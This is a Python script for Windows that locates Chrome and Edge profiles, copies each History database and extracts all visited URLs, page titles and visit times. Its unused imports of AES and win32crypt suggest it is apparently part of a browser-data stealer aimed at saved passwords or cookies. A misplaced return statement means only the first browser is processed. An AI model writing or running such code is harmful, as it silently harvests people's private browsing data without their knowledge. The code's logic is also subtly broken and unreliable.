import os
import shutil
import sqlite3
from Crypto.Cipher import AES 
import json
import base64
import win32crypt
import datetime

LOCAL = os.getenv("LOCALAPPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Microsoft Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def pro():
    profiles = {}
    for browser, base_path in PATHS.items():
        found = []
        if os.path.exists(base_path):
            for entry in os.listdir(base_path):
                profile_path = os.path.join(base_path, entry)
                if os.path.isdir(profile_path) and (
                    entry == "Default" or entry.startswith("Profile")
                ):
                    found.append(profile_path)
        profiles[browser] = found
    return profiles

def history():
    res = []
    profiles = pro()

    for browser, profile_paths in profiles.items():
        for profile_path in profile_paths:
            db_path = os.path.join(profile_path, "History")
            if not os.path.exists(db_path):
                continue

            tmp_db = os.path.join(os.getenv("TEMP"), "tmp_history.db")
            try:
                shutil.copy2(db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()

                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")

                for url, title, last_visit in cursor.fetchall():
                    try:
                        visit_time_dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit)
                        visit_time = visit_time_dt.strftime("%Y-%m-%dT%H:%M:%S")
                    except Exception:
                        visit_time = "Unknown"

                    res.append({
                        "browser": browser,
                        "url": url,
                        "title": title,
                        "last_visit": visit_time,
                    })

                cursor.close()
                conn.close()
            except Exception as e:
                res.append({"error": str(e)})
            finally:
                if os.path.exists(tmp_db):
                    os.remove(tmp_db)
        return res
